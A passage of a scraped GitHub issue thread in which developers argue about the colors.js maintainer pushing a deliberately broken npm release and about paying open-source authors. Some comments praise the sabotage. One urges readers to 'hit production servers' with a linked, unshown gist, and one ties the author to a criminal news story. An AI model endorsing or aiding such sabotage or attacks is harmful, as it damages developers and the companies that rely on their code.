'01\/10\/2022, 08:32:28', 'body': \"Just don't use MIT license, if you don't want some corporation to reuse your work and get money for it. Try some other alternatives, which will require consumer to open source their code as well, or a license without permission for commercial use. You can change license at any moment - if I recall that correctly Facebook did something like that with React. Pushing a broken version to NPM is simply wrong.\"}, 'com_12': {'author': 'Fried-Chicken', 'datetime': '01\/10\/2022, 10:03:13', 'body': 'What happened to `1.4.44-liberty-1`?'}, 'com_13': {'author': 'mirzap', 'datetime': '01\/10\/2022, 10:47:03', 'body': 'Why did you open source it if you want to get paid for it? Why did you use MIT license? Tantrum that you did does not help OSS developers. This is simply evil.'}, 'com_14': {'author': 'sergeych', 'datetime': '01\/10\/2022, 11:01:46', 'body': 'When one is publishing something as a free software the LICENSE is supplied which grants everybody a RIGHT to use your code without paying \"a penny\". Any sort of open source license does it one way or another. It protects users. This means, once something is published as free software, this version will remain free and usable to whoever have a copy even if the author changes ones mind to require a payment for it. So, any package or source repository as a _user_ of this free software retains a right to keep publishing it according to the open source license that was (if it was) supplied with original publication. That is why open source still uses licenses. We could not have free software if any author or the heirs could reclaim or make unusable the free software. What was once a gift to the society, should remain a gift. There the gift back is not fair at all, neither is requiring payment for a gift. Too bad, actually, that it is not crystal clear to anybody.'}, 'com_15': {'author': 'Nazehs', 'datetime': '01\/10\/2022, 12:29:51', 'body': \"at least he has made a name for himself at least... \ud83d\ude06 \ud83d\ude06 and some of us have used his code but we can't admit or say thanks to him... I am not advocating this but it's good we compensate ourselves sometimes to keep maintaining the source code because all of us value our time so do the authors too... $1 dollar will mean a lot to them and encourage them to work on the project... I believe once the author of Open source releases the codebase they have done all they could but if we will be expecting them to fix issues or add features while we are making our money out of it does it make sense at all? Many of us can't even open-source our code....\\r\\nShalom\"}, 'com_16': {'author': 'ddzy', 'datetime': '01\/10\/2022, 12:31:53', 'body': 'It wasted my whole day looking for the problem of garbled code'}, 'com_17': {'author': 'Nazehs', 'datetime': '01\/10\/2022, 12:52:25', 'body': '> \\r\\n\\r\\nyeah i know a lot of us will waste hours trying to figure out the issue you know'}, 'com_18': {'author': 'AAGene', 'datetime': '01\/10\/2022, 13:20:27', 'body': 'To those saying he should release under another license:\\r\\n\\r\\n![image](https:\/\/user-images.githubusercontent.com\/48164468\/148772692-0f4c911b-f277-44f4-8034-16c4b38b0e88.png)'}, 'com_19': {'author': 'ts-3156', 'datetime': '01\/10\/2022, 13:39:11', 'body': 'I just paid @Marak 100$. If you have a time to have a futile dispute, use that time to help people in need.'}, 'com_20': {'author': 'efriandika', 'datetime': '01\/10\/2022, 14:17:07', 'body': 'I am wondering if this is the same people?\\r\\nhttps:\/\/twitter.com\/marak\/status\/1320465599319990272\\r\\nhttps:\/\/nypost.com\/2020\/09\/16\/resident-of-nyc-home-with-suspected-bomb-making-materials-charged\/'}, 'com_21': {'author': 'timup', 'datetime': '01\/10\/2022, 14:20:51', 'body': '> I am wondering if this is the same people? https:\/\/twitter.com\/marak\/status\/1320465599319990272 https:\/\/nypost.com\/2020\/09\/16\/resident-of-nyc-home-with-suspected-bomb-making-materials-charged\/\\r\\n\\r\\nThat is an unfortunate coincidence.'}, 'com_22': {'author': 'zmaktouf', 'datetime': '01\/10\/2022, 14:31:46', 'body': \"> > Everyone should contribute with $1 to the author. He will get the money he deserves. I am not using `colors.js`, but I will be happy to contribute\\r\\n> \\r\\n> and let's pay to terrorists too because that is the same meaning I think\\r\\n\\r\\nWhat are you talking about? This is incomparable. \\r\\nThis is about helping someone from the community, our side, someone who might be in need, we don't know.\\r\\nToday it is him, maybe tomorrow it will be you.\"}, 'com_23': {'author': 'justblender', 'datetime': '01\/10\/2022, 14:37:11', 'body': '> I am wondering if this is the same people?\\r\\n> https:\/\/twitter.com\/marak\/status\/1320465599319990272\\r\\n> https:\/\/nypost.com\/2020\/09\/16\/resident-of-nyc-home-with-suspected-bomb-making-materials-charged\/\\r\\n\\r\\nYes, this is him.'}, 'com_24': {'author': 'degr', 'datetime': '01\/10\/2022, 14:47:19', 'body': 'post in epic thread'}, 'com_25': {'author': 'rpv-tomsk', 'datetime': '01\/10\/2022, 15:16:04', 'body': \"> It wasted my whole day looking for the problem of garbled code\\r\\n\\r\\nIt's just a time came to pay your bill for using this library.\\r\\nBefore that, you saved your time by using it.\"}, 'com_26': {'author': 'ademidun', 'datetime': '01\/10\/2022, 15:31:42', 'body': 'Open source software is a [public good](https:\/\/en.wikipedia.org\/wiki\/Public_good_(economics)). So the paradox which everyone asks themselves is \"if everyone can benefit from it for free why should I have to pay?\".\\r\\n\\r\\nBut conversely, if people are benefitting from something you\\'ve created then it\\'s only fair for the person who created this value to get some financial compensation commensurate to the value they\\'ve created.\\r\\n\\r\\nThe author of this package has chosen a method to get some compensation for their work that has resulted in a lose-lose situation where neither the author nor the users are happy.\\r\\n\\r\\nBut it doesn\\'t have to be this way.\\r\\n\\r\\nThe [Opensource guide](https:\/\/opensource.guide\/) has some useful tips on [Getting Paid for Open Source Work](https:\/\/opensource.guide\/getting-paid\/). For people interested in web3 and crypto, [Gitcoin](https:\/\/gitcoin.co\/) is platform where you can [get paid to work on open source software](https:\/\/gitcoin.co\/grants\/).\\r\\n\\r\\nHopefully, by becoming more informed on ways to make money from open source software we can avoid situations like this in the future and create a fairer system that works for everyone.'}, 'com_27': {'author': 'Veetaha', 'datetime': '01\/10\/2022, 15:50:23', 'body': 'Yo, you should consider rewriting it in Rust =)'}, 'com_28': {'author': 'G2G2G2G', 'datetime': '01\/10\/2022, 16:47:45', 'body': 'You are a hero, anyone who uses NPM deserves worse than this but at least you make them suffer.'}, 'com_29': {'author': 'Abion47', 'datetime': '01\/10\/2022, 17:07:04', 'body': \"This package hadn't been updated since 2019 before this. You want to suddenly be paid after 2-3 years of doing no work? And why now, all of a sudden?\\r\\n\\r\\nI'm not buying the moral high road, either. Fortune 500 companies have hundreds of developers and rigorous upgrade paths before any new production build sees the light of day, and this infantile infinite loop of zalgo text would get spotted immediately and fixed. Your little maneuver isn't going to cost them a single dime. All you're doing is being a pain in the ass for smaller companies and independent developers who don't have the luxury of time and resources to be able to put up these kinds of safeguards automatically.\\r\\n\\r\\nI'm fully on board with active contributors to the open-source community getting fair compensation, but this just screams trying to snag a quick and easy buck.\"}, 'com_30': {'author': 'rcollette', 'datetime': '01\/10\/2022, 17:23:05', 'body': 'If someone wants money for their time, either start a company or work for one.   This behavior is like a childish prank of putting a dollar on the sidewalk on a fishing line and pulling it away.'}, 'com_31': {'author': 'G2G2G2G', 'datetime': '01\/10\/2022, 17:32:27', 'body': '> If someone wants money for their time, either start a company or work for one. This behavior is like a childish prank of putting a dollar on the sidewalk on a fishing line and pulling it away.\\r\\n\\r\\n@rcollette  AND YOU FELL FOR IT LMAO\\r\\n\\r\\n\\r\\n\\r\\n\u2591\u2591\u2591\u2591\u2588\u2592\u2592\u2584\u2580\u2580\u2580\u2580\u2580\u2584\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2584\u2584\u2580\u2580\u2580\u2580\u2580\u2580\u2584\\r\\n\u2591\u2591\u2584\u2580\u2592\u2592\u2592\u2584\u2588\u2588\u2588\u2588\u2588\u2584\u2592\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\u2592\u2584\u2588\u2588\u2588\u2588\u2588\u2584\u2592\u2588\\r\\n\u2591\u2588\u2592\u2592\u2592\u2592\u2590\u2588\u2588\u2584\u2588\u2588\u2588\u2588\u258c\u2592\u2588\u2592\u2592\u2592\u2592\u2592\u2588\u2592\u2590\u2588\u2588\u2584\u2588\u2588\u2588\u2588\u258c\u2592\u2588\\r\\n\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2588\u2588\u2588\u2588\u2588\u2580\u2592\u2592\u2588\u2592\u2591\u2584\u2592\u2584\u2588\u2592\u2592\u2580\u2588\u2588\u2588\u2588\u2588\u2580\u2592\u2592\u2592\u2588\\r\\n\u2592\u2592\u2590\u2592\u2592\u2592\u2591\u2591\u2591\u2591\u2592\u2592\u2592\u2592\u2592\u2588\u2592\u2591\u2592\u2592\u2580\u2592\u2592\u2588\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\\r\\n\u2592\u258c\u2592\u2592\u2592\u2591\u2591\u2591\u2592\u2592\u2592\u2592\u2592\u2584\u2580\u2592\u2591\u2592\u2584\u2588\u2584\u2588\u2584\u2592\u2580\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u258c\\r\\n\u2592\u258c\u2592\u2592\u2592\u2592\u2591\u2592\u2592\u2592\u2592\u2592\u2592\u2580\u2584\u2592\u2592\u2588\u258c\u258c\u258c\u258c\u258c\u2588\u2584\u2580\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2590\\r\\n\u2592\u2590\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u258c\u2592\u2592\u2580\u2588\u2588\u2588\u2580\u2592\u258c\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u258c\\r\\n\u2580\u2580\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u258c\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2590\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2588\\r\\n\u2580\u2584\u2592\u2580\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2590\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2584\u2584\u2584\u2584\u2592\u2592\u2592\u2592\u2592\u2592\u2584\u2584\u2580\\r\\n\u2592\u2592\u2580\u2584\u2592\u2580\u2584\u2580\u2580\u2580\u2584\u2580\u2580\u2580\u2580\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2580\u2591\u2591\u2591\u2591\u2580\u2580\u2580\u2580\u2580\u2580\\r\\n\u2592\u2592\u2592\u2592\u2580\u2584\u2590\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2590\\r\\n\u2591\u2584\u2584\u2584\u2591\u2591\u2584\u2591\u2591\u2584\u2591\u2584\u2591\u2591\u2584\u2591\u2591\u2584\u2591\u2591\u2591\u2591\u2584\u2584\u2591\u2584\u2584\u2591\u2591\u2591\u2584\u2584\u2584\u2591\u2591\u2591\u2584\u2584\u2584\\r\\n\u2588\u2584\u2584\u2584\u2588\u2591\u2588\u2584\u2584\u2588\u2591\u2588\u2584\u2584\u2588\u2591\u2591\u2588\u2591\u2591\u2591\u2588\u2591\u2591\u2588\u2591\u2591\u2588\u2591\u2588\u2584\u2584\u2584\u2588\u2591\u2588\u2591\u2591\u2591\u2588\\r\\n\u2588\u2591\u2591\u2591\u2588\u2591\u2591\u2588\u2591\u2591\u2591\u2591\u2588\u2591\u2591\u2591\u2591\u2588\u2591\u2591\u2591\u2588\u2591\u2591\u2588\u2591\u2591\u2588\u2591\u2588\u2591\u2591\u2591\u2588\u2591\u2588\u2591\u2591\u2591\u2588\\r\\n\u2580\u2591\u2591\u2591\u2580\u2591\u2591\u2580\u2591\u2591\u2591\u2591\u2580\u2591\u2591\u2591\u2591\u2580\u2580\u2580\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2580\u2591\u2591\u2591\u2580\u2591\u2580\u2584\u2584\u2584\u2580'}, 'com_32': {'author': 'rcollette', 'datetime': '01\/10\/2022, 17:38:12', 'body': '@G2G2G2G -Nope.  I pin package versions.\\r\\nhttps:\/\/github.com\/winstonjs\/winston\/issues\/1995#event-5867271529'}, 'com_33': {'author': 'TechStudent10', 'datetime': '01\/10\/2022, 20:12:30', 'body': '> > I am wondering if this is the same people? https:\/\/twitter.com\/marak\/status\/1320465599319990272 https:\/\/nypost.com\/2020\/09\/16\/resident-of-nyc-home-with-suspected-bomb-making-materials-charged\/\\r\\n> \\r\\n> That is an unfortunate coincidence.\\r\\n\\r\\noh crap'}, 'com_34': {'author': 'skyzyx', 'datetime': '01\/10\/2022, 20:53:51', 'body': 'Have we learned nothing from left-pad?\\r\\n\\r\\n1. Use a package cache.\\r\\n2. Pin your versions.'}, 'com_35': {'author': 'zmaktouf', 'datetime': '01\/10\/2022, 22:24:38', 'body': \"> Yo, you should consider rewriting it in Rust =)\\r\\n\\r\\nLet's do it :D https:\/\/github.com\/zmaktouf\/colors.rs\"}, 'com_36': {'author': 'barnaba', 'datetime': '01\/11\/2022, 02:07:06', 'body': \"> This package hadn't been updated since 2019 before this. You want to suddenly be paid after 2-3 years of doing no work? And why now, all of a sudden?\\r\\n\\r\\nBecause https:\/\/web.archive.org\/web\/20210628030444\/https:\/\/marak.com\/blog\/2021-04-25-monetizing-open-source-is-problematic\\r\\n\\r\\nTLDR the dev tried to monetize faker via normal means available to open source projects, but corporations don't play nice.\\r\\n\\r\\nMore important question is: This package hadn't been updated since 2019 before this. Why not pin it? Are you expecting new colors to be invented?\"}, 'com_37': {'author': 'yvesll', 'datetime': '01\/11\/2022, 05:41:43', 'body': 'Respect'}, 'com_38': {'author': 'Chew', 'datetime': '01\/11\/2022, 06:12:28', 'body': '> What happened to `1.4.44-liberty-1`?\\r\\n\\r\\nI was hungry, my bad'}, 'com_39': {'author': 'prasannamestha', 'datetime': '01\/11\/2022, 07:36:56', 'body': 'Why no sell a commercial license to this library via [privjs.com](https:\/\/privjs.com) ?'}, 'com_40': {'author': 'artsiom-aliakseichyk', 'datetime': '01\/11\/2022, 08:40:07', 'body': '> \u041c\u044b \u043f\u043e\u043d\u044f\u043b\u0438 \u043e\u0434\u043d\u043e, \u0447\u0442\u043e \u043e\u043d \u043c\u0443\u0434\u0430\u043a \u0438 \u043f\u0440\u043e\u0441\u0442\u043e \u0432\u043e\u0437\u044c\u043c\u0435\u043c \u0438 \u043e\u0442\u043a\u0430\u0442\u0438\u043c \u0432\u0435\u0440\u0441\u0438\u044e \u0438\u043b\u0438 \u0432\u043e\u0437\u044c\u043c\u0435\u043c \u0430\u043b\u044c\u0442\u0435\u0440\u043d\u0430\u0442\u0438\u0432\u0443 \u043e\u0442 \u043c\u0435\u043d\u0435\u0435 \u043e\u0442\u0431\u0438\u0442\u044b\u0445 \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a\u043e\u0432, \u0435\u0441\u043b\u0438 \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a\u0443 \u043d\u0435 \u043f\u043e\u0441\u0442\u0430\u0432\u0438\u043b\u0438 \u043b\u0430\u0439\u043a \u0438\u043b\u0438 \u043d\u0435 \u0437\u0430\u043f\u043b\u0430\u0442\u0438\u043b\u0438 \u0437\u0430 \u043b\u0438\u0431\u0443 \u043a\u043e\u0442\u043e\u0440\u0443\u044e \u043e\u043d \u0432\u044b\u043a\u043b\u0430\u0434\u044b\u0432\u0430\u0435\u0442 \u0432 \u043e\u0442\u043a\u0440\u044b\u0442\u043e\u043c \u0432\u0438\u0434\u0435, \u043d\u0430 \u0431\u0435\u0441\u043f\u043b\u0430\u0442\u043d\u043e\u0439 \u043f\u043b\u0430\u0442\u0444\u043e\u0440\u043c\u0435, \u043f\u043e\u0434 \u0431\u0435\u0441\u043f\u043b\u0430\u0442\u043d\u043e\u0439 \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u0435\u0439, \u0442\u043e \u0443 \u043d\u0435\u0433\u043e \u043f\u0440\u043e\u0431\u043b\u0435\u043c\u0430 \u0441 \u0431\u0430\u0448\u043a\u043e\u0439\\r\\n\\r\\nI understand that it is hard to read licenses nowadays, so I will copypaste one of the interesting part\\r\\n\\r\\n\\'THE SOFTWARE IS PROVIDED **\"AS IS\"**, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\\r\\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\\r\\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\\r\\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\\r\\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\\r\\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\\r\\nTHE SOFTWARE.\\''}, 'com_41': {'author': 'kounelios13', 'datetime': '01\/11\/2022, 10:03:31', 'body': '> You are a hero, anyone who uses NPM deserves worse than this but at least you make them suffer.\\r\\n\\r\\nWhy anyone who uses NPM deserves worse than that? Care to explain ?'}, 'com_42': {'author': 'arinzejustin', 'datetime': '01\/11\/2022, 14:16:02', 'body': 'I spend through out yesterday and today looking for the issue'}, 'com_43': {'author': 'Abion47', 'datetime': '01\/11\/2022, 14:46:26', 'body': '> > This package hadn\\'t been updated since 2019 before this. You want to suddenly be paid after 2-3 years of doing no work? And why now, all of a sudden?\\r\\n> \\r\\n> Because https:\/\/web.archive.org\/web\/20210628030444\/https:\/\/marak.com\/blog\/2021-04-25-monetizing-open-source-is-problematic\\r\\n> \\r\\n> TLDR the dev tried to monetize faker via normal means available to open source projects, but corporations don\\'t play nice.\\r\\n> \\r\\n> More important question is: This package hadn\\'t been updated since 2019 before this. Why not pin it? Are you expecting new colors to be invented?\\r\\n\\r\\nThat article is referring to Faker where I was referring to Colors. Since you bring it up, however, the amount of recent work on Faker is even less - a bit of work 10-12 months ago, and before that, complete radio silence since 5 years ago. It sucks that the author\\'s attempts to sell faker cloud were met with getting ghosted, but what did he expect? He released a paid service that did little more than the existing package already did for free. He was competing against himself, and he was doing it poorly. And sure, maybe it was poor form on Retool\\'s part to copy FakerCloud using Faker, but at the same time, they were effectively paying him $500 a month which they were under no legal obligation to pay. The only thing his tantrum could\\'ve possibly accomplished was that they would continue to do exactly what they were doing but they would do it without paying him.\\r\\n\\r\\nAn interesting note on that last part, though. I don\\'t know about you, but getting two grand for work I did four years ago seems like a good deal. Not only this, but they were his _second_ biggest donors, meaning that that was less than half of the donation amount he had made from the Faker package alone as of that article\\'s publication date. And now he\\'s threatening to not do any more work when he already hasn\\'t done any work on the Colors or Faker packages in nearly a year and no significant work in nearly three, and he\\'s demanding payment for packages he released under the MIT license years ago _and which he has already received at least $4000 for_. Not to mention I can only imagine how much money he has received from proverbial white knights ever since this whole drama began. (Someone in this thread alone donated $100.)\\r\\n\\r\\nMy takeaway from that article is that Marak bit the hand that fed him. It sounds like he already burned the Retool bridge which was a poor move considering they were his second-biggest donors, and I doubt anyone else who was a repeat donor is likely to continue. He proved nothing with this little stunt - no large company will be hurt by this despite his claims, and everyone else just has to pin their versions and wait until someone else forks his code to continue development and maintenance (not that much maintenance needs to be done as the packages seem pretty stable).\\r\\n\\r\\nHe could\\'ve pinned it. He could\\'ve archived it. He could\\'ve just posted a message saying \"I can\\'t afford to maintain this anymore so it will just sit here in its current state until someone else offers to take ownership\". He could\\'ve done a lot of things. But instead, he chose the nuclear option of holding the package hostage (as ineffective as it is) while causing grief to other developers like him just trying to do their jobs. This doesn\\'t strike me as a man looking to get fair recompense for services rendered. This strikes me as a man desperate for money and looking to get it in any way he can by pulling on some heartstrings. Well, congrats, Marak. Mission accomplished. You may have tanked your career and your standing in the open-source community in the process, but I hope it was worth it in the end.'}, 'com_44': {'author': 'Awilum', 'datetime': '01\/11\/2022, 17:11:07', 'body': '> What is this? Why console is trashed with all this random shit?\\r\\n\\r\\nThis is Javascript World!'}, 'com_45': {'author': 'zunino', 'datetime': '01\/11\/2022, 22:26:40', 'body': \"If you were looking for sympathy, you've really messed up. Your attitude is not only immature, but irresponsible and very unprofessional. There are other ways one can turn an open-source project into a business, but it's not by acting out like this. You don't belong in OSS.\"}, 'com_46': {'author': 'rpv-tomsk', 'datetime': '01\/12\/2022, 04:43:33', 'body': \"@zunino \\r\\n\\r\\n> If you were looking for sympathy, you've really messed up. \\r\\n\\r\\nAgreed. \\r\\nBut:\\r\\n\\r\\n> There are other ways one can turn an open-source project into a business...\\r\\n\\r\\nYou have many OSS project already converted to business?\\r\\nCan you show your results, our you can only speak slogans and loud words?\\r\\n\\r\\nIn my view, there is two kinds of people: who can create software and who can create business. \\r\\nAnd not each developer belongs to both sets simultaneously, these are exceptions, not typical case (and we see this here).\"}, 'com_47': {'author': 'ItzSwirlz', 'datetime': '01\/12\/2022, 16:21:32', 'body': 'man cant change his license to stop it from being used'}, 'com_48': {'author': 'kctdfh', 'datetime': '01\/13\/2022, 16:33:36', 'body': \"> > You have many OSS project already converted to business?\\r\\n> \\r\\n> Not so many, but there are a few - rather big - projects that do converted and are doing well now.\\r\\n> \\r\\n> > Can you show your results,\\r\\n> \\r\\n> Discourse, GitLab, NodeBB, Docker. Just from back of my head; sure there are more.\\r\\n\\r\\nAll of the examples you mention sell convenience, not software. \\r\\n\\r\\nFor some software solutions, the user may want to have the luxuries of open-source without having to fully commit full-time resources to the management and maintenance of those people\/infrastructures. Marak could have never been RedHat because Faker\/Colors are set-it-and-forget-it libraries. For these libraries, most of the work happens prior to release and the user just plugs it into their code. There's near-zero opportunities to monetize them by offering convenience. Mattermost for instance has a paid version that's hosted and has extra features but what can Faker\/Colors do? Invent exclusive colors? Implement SSO? Generate entire movie scripts?\\r\\n\\r\\nMaybe he could have started an API for no-code tools but then again, no-code devs are used to extremely generous free-tiers on APIs so it probably won't cover the cost of running a reliable infrastructure to handle usage bursts, etc.\"}, 'com_49': {'author': 'zunino', 'datetime': '01\/13\/2022, 19:20:25', 'body': \"@kctdfh I see the distinction you are making but, really, nothing justifies the author's rogue actions. I'm sure he would be in a better position if, say, he had decided to start a new, commercial endeavour, having the success of his open-source projects under his wing. The popularity of open-source work can shine on a CV or business proposal.\"}, 'com_50': {'author': 'kctdfh', 'datetime': '01\/13\/2022, 20:05:06', 'body': '@cronlabspl ?? Have not seen a start-up call themselves \"fully-managed [insert open-source tech]\"?? MongoDB Atlas is a money machine because people like using MongoDB without having to fine-tune their own provisioning, scaling, sharding, replication, security, or correctness. Who can afford reading MongoDB documentations, risk making a rookie mistake, spend hours every week troubleshooting, and basically manage people who manage the code that manages their software? They\\'ll just pay MongoDB to abstract the boring stuff away. It\\'s buying convenience.\\r\\n\\r\\n@zunino Yeah for sure not the best way to handle it and I don\\'t agree with it but I somewhat understand it. I see it like this (conjecture):\\r\\n- Dev isn\\'t doing well and feels unappreciated \/ feels they are being wronged - maybe even for an unrelated reason.\\r\\n- NPM\\'s weekly download stats says they\\'re appreciated\/valued\/successful but that number isn\\'t amounting to anything in their day-to-day. They know that this situation isn\\'t unique to them in the FOSS community.\\r\\n- Nuking their popular packages is certainly a good way to remind people that they depend on devs they\\'ve never heard of who may not be doing well. Not an effective form of protest because it ruins their reputation with zero sustained effect but it did rejuvenate the conversation.\\r\\n\\r\\nI wish him luck and hope he\\'s doing well'}, 'com_51': {'author': 'quenbyako', 'datetime': '01\/13\/2022, 21:08:59', 'body': '@glebfeklistov \u0441\u0440\u0430\u0437\u0443 \u0432\u0438\u0434\u043d\u043e \u0440\u0443\u0441\u0441\u043a\u043e\u0433\u043e \u0447\u0435\u043b\u043e\u0432\u0435\u043a\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043d\u0430\u0437\u043e\u0432\u0435\u0442 \u0430\u0432\u0442\u043e\u0440\u0430 \u0430\u0441\u0445\u043e\u043b\u043e\u043c, \u0437\u0430 \u0442\u043e, \u0447\u0442\u043e \u043d\u0430 \u0435\u0433\u043e \u043f\u043e\u0442\u0440\u0435\u0431\u043d\u043e\u0441\u0442\u0438 \u043d\u0438\u043a\u0442\u043e \u043d\u0435 \u043e\u0431\u0440\u0430\u0449\u0430\u0435\u0442 \u0432\u043d\u0438\u043c\u0430\u043d\u0438\u044f, \u0445\u043e\u0442\u044f \u043e\u043d \u0441\u0434\u0435\u043b\u0430\u043b \u043b\u0438\u0431\u0443, \u043a\u043e\u0442\u043e\u0440\u0443\u044e \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442 \u043f\u043e\u043b\u043e\u0432\u0438\u043d\u0430 \u043d\u043e\u0434\u043e\u0432\u0441\u043a\u043e\u0433\u043e \u043a\u043e\u043c\u044c\u044e\u043d\u0438\u0442\u0438.\\r\\n\\r\\n\u0413\u043b\u0435\u0431, \u043a\u0440\u0430\u0441\u0430\u0432\u0447\u0438\u043a, \u043b\u0443\u0447\u0448\u0438\u0439 \ud83d\udc4d\ud83d\udcaa \u0422\u0430\u043a \u0438\u0445, \u0434\u043e\u043b\u0431\u043e\u0435\u0431\u043e\u0432, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043a\u043e\u043c\u043c\u0438\u0442\u044f\u0442 \u0432 \u043e\u043f\u0435\u043d\u0441\u0443\u0440\u0441 \u0437\u0430 \u043f\u0440\u043e\u0441\u0442\u043e \u0442\u0430\u043a, \u043f\u043e\u0448\u043b\u0438 \u043e\u043d\u0438, \u043d\u0430\u0441\u0442\u043e\u044f\u0449\u0438\u0435 \u043c\u0443\u0436\u0438\u043a\u0438 \u043a\u043e\u043c\u043c\u0438\u0442\u044f\u0442 \u0440\u0430\u0437 \u0432 \u043f\u043e\u043b\u0433\u043e\u0434\u0430 \u0438 \u043e\u0431\u0437\u044b\u0432\u0430\u044e\u0442 \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a\u043e\u0432 \u043c\u0443\u0434\u0430\u043a\u0430\u043c\u0438. \u041f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u044e! \ud83d\udc46'}, 'com_52': {'author': 'Lun3th', 'datetime': '01\/13\/2022, 23:42:40', 'body': \"So basically... he's own the code so he can do this thing. If you are a big company please support open source projects with MONEY. And also check a code change before you pull it blatantly. :D \\r\\n\\r\\nBtw. If I find his paypal I will donate him with 2-3 dollars because that was a big move :D\"}, 'com_53': {'author': 'hello-smile6', 'datetime': '01\/14\/2022, 04:25:40', 'body': \"If anyone is in charge of a large corporation's servers and wants to make a splash, just hit production servers with https:\/\/gist.github.com\/hello-smile6\/fa92b539fce2339440bdd75e087cae8b\"}, 'com_54': {'author': 'okyanusoz', 'datetime': '01\/14\/2022, 15:15:10', 'body': 'stop'}, 'com_55': {'author': 'sech1p', 'datetime': '01\/15\/2022, 11:20:45', 'body': 'What really happened with Aaron Swartz?'}, 'com_56': {'author': 'sech1p', 'datetime': '01\/15\/2022, 11:32:09', 'body': '> > What really happened with Aaron Swartz?\\r\\n> \\r\\n> No idea. [this](https:\/\/en.wikipedia.org\/wiki\/Aaron_Swartz) may help\\r\\n\\r\\ntwierdzenie Pitagorasa\\r\\nnie wierz w samob\u00f3jstwo Swartza'}, 'com_57': {'author': 'sech1p', 'datetime': '01\/15\/2022, 11:42:40', 'body': \"> > nie wierz w samob\u00f3jstwo Swartza\\r\\n> \\r\\n> Nigdzie nie napisa\u0142em \u017ce wierz\u0119 w to. Poda\u0142em tylko linka do artyku\u0142u.\\r\\n\\r\\nchill, chill, I just parafrased a one sentence from polish network, i don't judge whether you believe it or not\\r\\n\\r\\nbtw i read this article already\"}, 'com_58': {'author': 'xpswilllive', 'datetime': '01\/18\/2022, 06:17:41', 'body': 'u are fine'}, 'com_59': {'author': 'dmitrykurmanov', 'datetime': '01\/19\/2022, 10:25:52', 'body': \"> > > Everyone should contribute with $1 to the author. He will get the money he deserves. I am not using `colors.js`, but I will be happy to contribute\\r\\n> > \\r\\n> > \\r\\n> > and let's pay to terrorists too because that is the same meaning I think\\r\\n> \\r\\n> What are you talking about? This is incomparable. This is about helping someone from the community, our side, someone who might be in need, we don't know. Today it is him, maybe tomorrow it will be you.\\r\\n\\r\\nhelp him because he is asking for help is ok for me. I don't hate him personally or anything like that. But I think that it should be asking not demanding\/terrorizing. I wish him to be happy. I don't judge him. I judge his act and the situation. And it is a huge difference for me\"}, 'com_60': {'author': 'teror4uks', 'datetime': '01\/21\/2022, 13:40:37', 'body': '@quenbyako \u0441\u0440\u0430\u0437\u0443 \u0432\u0438\u0434\u043d\u043e \u0440\u0443\u0441\u0441\u043a\u043e\u0433\u043e \u0447\u0435\u043b\u043e\u0432\u0435\u043a\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043d\u0435 \u0443\u043c\u0435\u0435\u0442 \u0447\u0438\u0442\u0430\u0442\u044c \u043e\u043f\u0435\u043d\u0441\u043e\u0440\u0441\u043d\u044b\u0435 \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u0438 \u043d\u0430 \u0430\u043d\u0433\u043b\u0438\u0439\u0441\u043a\u043e\u043c \u0438\u0437 \u043a\u043e\u0442\u043e\u0440\u044b\u0445 \u043a\u0430\u043a \u0431\u044b \u0447\u0451\u0442\u043a\u043e \u0432\u044b\u0442\u0435\u043a\u0430\u0435\u0442, \u0447\u0442\u043e \u043d\u0438\u043a\u0442\u043e \u0442\u0435\u0431\u0435 \u043d\u0438\u0447\u0435\u0433\u043e \u043d\u0435 \u0434\u043e\u043b\u0436\u0435\u043d, \u043d\u0435 \u0445\u043e\u0447\u0435\u0448\u044c \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0442\u044c \u043d\u0435 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0439, \u0432\u0440\u0435\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e\u043c \u043d\u0438\u043a\u0442\u043e \u0442\u0435\u0431\u0435 \u043f\u0440\u0430\u0432\u0430 